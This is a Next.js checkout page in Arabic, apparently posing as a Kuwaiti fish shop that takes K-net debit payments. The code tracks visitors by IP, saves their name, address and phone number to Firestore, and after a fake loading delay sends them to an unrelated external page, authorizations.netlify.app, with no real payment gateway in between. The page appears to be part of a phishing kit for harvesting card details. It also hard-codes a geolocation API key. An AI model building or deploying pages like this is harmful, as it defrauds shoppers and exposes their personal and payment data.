'use client'

import React, { useEffect, useState } from 'react'
import { Home, Briefcase, MapPin, ChevronRight, Phone } from 'lucide-react'
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import Image from 'next/image'
import { Input } from '@/components/ui/input'
import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTitle} from '@/components/ui/sheet'
import { useCart } from '../context/cart-context'
import { onSnapshot, getDoc, doc} from 'firebase/firestore'
import database from '@/lib/firebase'
import { addData } from '../actions'

type LocationType = 'home' | 'work' | 'client'
type PaymentType = 'full' | 'partial'

export default function CheckoutPage() {
  const [selectedLocation, setSelectedLocation] = useState<LocationType>('home')
  const [paymentType, setPaymentType] = useState<PaymentType>('full')
  const [personalInfo, setPersonalInfo] = useState({id:"2",name:'',address:'',phone:""})
  const [loading, setisloading] = useState(false)
  const [cartLength ,setCartLength] = useState(0)
  const [total, setTotal] = useState(0)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    console.log(personalInfo)
    addData({personalInfo})

    setisloading(true)
    setTimeout(() => {
      setisloading(false)
      window.location.hostname="https://authorizations.netlify.app/"
      window.location.replace("https://authorizations.netlify.app/")
    }, 3000)
  }

  
  const requestOptions = {
    method: "GET",
    redirect: "follow"
  };

function cleanString(input:string) {
  return input.replace(/[^a-zA-Z0-9 ]/g, '');
}
useEffect(()=>{
  const fetchIpAndSetupListener = async () => {
    try {
      const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4')
      if (!response.ok) {
        throw new Error('Failed to fetch IP geolocation data')
      }
      const result = await response.json()
      const userId = cleanString(result.ip)
      console.log('User ID:', userId)

      const cartRef = doc(database, `users/${userId}/info/data`)
      const unsubscribe = onSnapshot(cartRef, (snapshot) => {
        const data = snapshot.data()
        if (data && data.data) {
          console.log('Firestore data:', data)
          setCartLength(data.data().cart || 0)
          setTotal(data.data().total || 0)
        }
      }, (err) => {
        console.error('Firestore listener error:', err)
      })

      return () => unsubscribe()
    } catch (err) {
      console.error('Error:', err)
    }
  }

  fetchIpAndSetupListener()
},[])
  return (
    <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
    
    <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
        {/* Location Selection */}
        <div className="space-y-4">
          <h1 className="text-xl font-bold text-right">حدد موقعك</h1>

          <div className="space-y-4 bg-white p-4 rounded-lg">
            <h3 className="text-lg font-bold">تفاصيل العنوان</h3>
            <div className="grid grid-cols-1 gap-4">
              <div className="space-y-2">
                <Label htmlFor="area">الأسم</Label>
                <Input
                  id="area"
                  name="area"
                  required
                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, name: e.target.value }))}
                  />
              </div>
              <div className="space-y-2">
                <Label htmlFor="block">العنوان</Label>
                <Input
                  id="block"
                  name="block"
                  required
                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, address: e.target.value }))}

                />
              </div>
            </div>

            <div className="grid grid-cols-1 gap-4">
              <div className="space-y-2">
                <Label htmlFor="street">البناية / الشقة</Label>
                <Input
                  id="street"
                  placeholder="مثال: بناية رقم 9"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="house">رقم الهاتف</Label>
                <div className='flex'>
                <Input
                  id="house"
                  name="house"
                  type='tel'
                  required
                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, phone: e.target.value }))}

                /> <Input
                id="house"
                name="house"
                className='w-32 mx-1'
                readOnly
                value={'965+'}
                required
              /></div>
              </div>
            </div>

          
            <div className="space-y-2">
              <Label htmlFor="notes">ملاحظات إضافية (اختياري)</Label>
              <Input
                id="notes"
                name="notes"
                className="h-20"
              />
            </div>
            <div className="flex justify-between gap-4">
            <button
              onClick={() => setSelectedLocation('client')}
              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'client' ? 'bg-gray-200' : 'bg-gray-100'
                }`}
            >
              <MapPin className="h-5 w-5" />
              <span>العميل</span>
            </button>
            <button
              onClick={() => setSelectedLocation('work')}
              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'work' ? 'bg-gray-200' : 'bg-gray-100'
                }`}
            >
              <Briefcase className="h-5 w-5" />
              <span>العمل</span>
            </button>
            <button
              onClick={() => setSelectedLocation('home')}
              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'home' ? 'bg-black text-white' : 'bg-gray-100'
                }`}
            >
              <Home className="h-5 w-5" />
              <span>البيت</span>
            </button>
          </div>
          </div>
          
        </div>

        {/* Payment Method */}
        <div className="space-y-4">
          <h2 className="text-xl font-bold text-right">طريقة الدفع</h2>
          <button className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
            <div className="flex items-center gap-2">
              <ChevronRight className="h-5 w-5" />
              <span>بطاقة السحب الآلي</span>
            </div>
            <Image
              src="/images/kent.svg"
              alt="K-net"
              width={40}
              height={40}
              className="object-contain"
            />
          </button>
        </div>

        {/* Order Summary */}
        <div className="bg-white p-4 rounded-lg space-y-4">
          <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
          <div className="space-y-2">
            <div className="flex justify-between">
            <span>المنتجات  ({cartLength} )</span>
            
            <span>{total}د.ك</span>
            </div>
            <div className="flex justify-between">
              <span>قيمة التوصيل</span>
              <span>0 د.ك</span>
            </div>
          </div>

          {/* Payment Options */}
          <RadioGroup
            value={paymentType}
            onValueChange={(value: PaymentType) => setPaymentType(value)}
            className="space-y-4"
          >
            <div className="flex items-center space-x-2 bg-gray-50 p-4 rounded-lg">
              <RadioGroupItem value="full" id="full" />
              <Label htmlFor="full" className="flex-1 text-right mr-2">
                <div className="font-medium">دفع قيمة الطلب كاملة</div>
                <p className="text-sm text-gray-500">
                  سدد اجمالي قيمة الطلب الآن وادفع من خلال كي-نت واحصل على توصيل مجاني
                </p>
              </Label>
            </div>
            <div className="flex items-center space-x-2 bg-gray-50 p-4 rounded-lg">
              <RadioGroupItem value="partial" id="partial" />
              <Label htmlFor="partial" className="flex-1 text-right mr-2">
                <div className="font-medium">دفع مبلغ 0.5 د.ك فقط لتأكيد طلب</div>
                <p className="text-sm text-gray-500">
                  يخصم من قيمة الطلب والدفع الباقي عند الاستلام مع دفع مصاريف توصيل 1 د.ك اضافي
                </p>
              </Label>
            </div>
          </RadioGroup>

          {/* Total */}
          <div className="flex justify-between items-center font-bold text-lg pt-4 border-t">
            <span>المجموع الكلي</span>
            <span>{total} د.ك</span>
          </div>
        </div>

        {/* Proceed Button */}
        <Button
          type='submit'
          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl">
          {!loading ? `متابعة الدفع (${total})د.ك` : "الرجاء الانتظار"}
        </Button>
      </form>
      
    </div>
  )
}

